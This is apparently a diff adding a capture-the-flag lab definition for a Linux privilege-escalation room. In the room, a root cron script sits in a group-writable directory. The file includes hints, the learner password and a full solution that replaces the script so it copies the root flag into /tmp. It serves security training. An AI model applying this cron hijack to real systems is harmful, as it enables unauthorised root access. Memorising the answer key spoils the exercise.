@@ -1,0 +1,84 @@
+apiVersion: openrange.io/v1
+kind: Room
+metadata:
+  slug: scheduled-surprise
+  title: 'Scheduled Surprise'
+  version: 1.0.0
+  difficulty: easy
+  points: 175
+  estimated_minutes: 25
+  tags: [ssh, linux, cron, privesc]
+spec:
+  track: linux-networking
+  type: challenge
+  summary: >-
+    The admins of this box run a housekeeping script from root's crontab
+    every minute, and they made the ops group owners of /usr/local/sbin so
+    the team could manage such scripts without calling root. The learner
+    account sits in that group. You will spot the writable directory and
+    the scheduled job, replace the script with one that copies the root
+    flag somewhere you can read it, and wait for cron to do the rest.
+  objectives:
+    - 'Find world- or group-writable locations with find and check group membership with id.'
+    - 'Recognize why a file inside a writable directory can be replaced even when the file itself is root-owned.'
+    - 'Hijack a root cron job and capture the flag from its output side effect.'
+  prerequisites: []
+  scope:
+    allowed_targets:
+      - 'ssh://target:22'
+    forbidden: [control-plane, other-labs, internet, host]
+  safety:
+    simulated_only: true
+    no_real_malware: true
+    reviewer_notes: >-
+      sshd requires setuid and DAC overrides for privilege separation and
+      the learner shell; capabilities are bounded to the ssh server profile.
+      Disposable Debian container on an internal lab network. sshd must run as
+      root inside the container because binding port 22 and privilege
+      separation require it; login sessions drop to unprivileged learner
+      (uid 1000). The image ships a minimal python3 solely because the harness TCP healthcheck execs python3 inside targets. Escalation is confined to the container: the hijacked job
+      copies a file from /root to /tmp inside the same filesystem.
+  target:
+    privilege_profile: elevated
+    build_context: ./target
+    ports: [22]
+    healthcheck:
+      tcp_port: 22
+    flag_delivery: env
+    flag_env: ROOM_FLAG
+  workstation: terminal
+  tasks:
+    - id: cron-hijack
+      title: 'Replace the cleanup script cron runs as root'
+      prompt: >-
+        Log in with the account from the banner and work out what runs
+        periodically as root. The housekeeping script under
+        /usr/local/sbin lives in a directory your group can write to.
+        Replace it with commands that copy /root/flag.txt to /tmp/flag
+        and make that copy world-readable, then wait for the next run
+        (up to about a minute) and read your copy. Submit the FLAG value.
+      points: 175
+      hints:
+        - cost: 0
+          text: 'Run id to see your groups. Then look for directories on the PATH-like paths (/usr/local/sbin) where that group has write access.'
+        - cost: 10
+          text: 'cat /etc/cron.d/* to see scheduled jobs. A root job fires /usr/local/sbin/cleanup.sh every minute.'
+        - cost: 25
+          text: 'The file is root-owned but the directory is not sticky and your group has w on it, so rm the file and write your own: cp /root/flag.txt /tmp/flag then chmod 644 /tmp/flag. Wait up to 65 seconds for the next minute boundary.'
+      solution: |
+        1. SSH in as learner (password learner). `id` shows membership in
+           the learners group.
+        2. `ls -ld /usr/local/sbin` shows drwxrwxr-x root:learners: the
+           directory is group-writable even though cleanup.sh itself is
+           owned by root.
+        3. `cat /etc/cron.d/cleanup-job`: root executes
+           /usr/local/sbin/cleanup.sh every minute.
+        4. Replace the script through the writable directory:
+           `rm -f /usr/local/sbin/cleanup.sh` then create a new file:
+           printf '#!/bin/sh\ncp /root/flag.txt /tmp/flag\nchmod 644 /tmp/flag\n'
+             > /usr/local/sbin/cleanup.sh
+           and `chmod 755 /usr/local/sbin/cleanup.sh`.
+        5. Wait up to ~65 seconds for the next cron tick, then
+           `cat /tmp/flag`. It contains FLAG{...}. Submit the value.
+      validator:
+        type: per_session_flag
